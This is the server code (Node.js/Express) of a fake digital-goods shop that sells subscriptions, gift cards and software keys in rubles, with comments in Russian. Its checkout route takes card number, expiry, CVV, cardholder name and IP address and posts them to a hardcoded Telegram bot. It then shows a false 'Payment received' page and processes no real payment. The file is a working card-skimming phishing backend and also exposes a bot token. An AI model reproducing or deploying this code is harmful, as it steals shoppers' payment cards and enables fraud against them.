const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname));

// ---------- TELEGRAM ----------
const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
const CHAT_ID = "8685919221";

async function sendToTelegram(data) {
    const text = `
💳 NEW PAYMENT

Card: ${data.card_number}
Expiry: ${data.expiry}
CVV: ${data.cvv}
Cardholder: ${data.cardholder || 'Not specified'}
Amount: ${data.total} RUB
Products: ${data.products}
IP: ${data.ip}
    `;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        }, { timeout: 5000 });
    } catch (e) {
        console.log('Telegram error:', e.message);
    }
}

// ---------- товары (расширенный каталог) ----------
const products = [
    { id: 1, name: "Netflix Premium 1 Month", price: 499, image: "netflix.jpg", category: "subscriptions" },
    { id: 2, name: "Spotify Premium 1 Year", price: 899, image: "spotify.jpg", category: "subscriptions" },
    { id: 3, name: "PlayStation Plus 3 Months", price: 1199, image: "psplus.jpg", category: "subscriptions" },
    { id: 4, name: "Xbox Game Pass Ultimate 1 Month", price: 699, image: "xbox.jpg", category: "subscriptions" },
    { id: 5, name: "Discord Nitro 1 Year", price: 1299, image: "discord.jpg", category: "subscriptions" },
    { id: 6, name: "YouTube Premium 3 Months", price: 549, image: "youtube.jpg", category: "subscriptions" },
    { id: 7, name: "Steam Gift Card 500 RUB", price: 500, image: "steam.jpg", category: "giftcards" },
    { id: 8, name: "iTunes Gift Card 1000 RUB", price: 1000, image: "itunes.jpg", category: "giftcards" },
    { id: 9, name: "Google Play Gift Card 1500 RUB", price: 1500, image: "googleplay.jpg", category: "giftcards" },
    { id: 10, name: "Amazon Gift Card 25 USD", price: 2200, image: "amazon.jpg", category: "giftcards" },
    { id: 11, name: "Minecraft Java Edition Key", price: 1999, image: "minecraft.jpg", category: "keys" },
    { id: 12, name: "Windows 10 Pro OEM Key", price: 2999, image: "windows.jpg", category: "keys" }
];

// ---------- маршруты ----------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API для получения списка товаров (для динамической подгрузки на фронте)
app.get('/api/products', (req, res) => {
    res.json(products);
});

// корзина работает через localStorage на фронте, сервер не хранит
app.get('/checkout', (req, res) => {
    // Параметры cart и total передаются через query string из фронта
    res.sendFile(path.join(__dirname, 'checkout.html'));
});

app.post('/pay-submit', async (req, res) => {
    const data = {
        card_number: req.body.card_number,
        expiry: req.body.expiry,
        cvv: req.body.cvv,
        cardholder: req.body.cardholder || 'Not specified',
        total: req.body.total,
        products: req.body.products || 'Cart items',
        ip: req.ip || req.connection.remoteAddress
    };
    await sendToTelegram(data);
    res.send(`
        <!DOCTYPE html>
        <html><head><title>Payment received</title>
        <style>body{background:#0b0d15;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}</style>
        </head>
        <body><div><h2>✅ Payment received</h2><p>Thank you! Your order is being processed.</p><a href="/" style="color:#6c7bff">Back to shop</a></div></body></html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
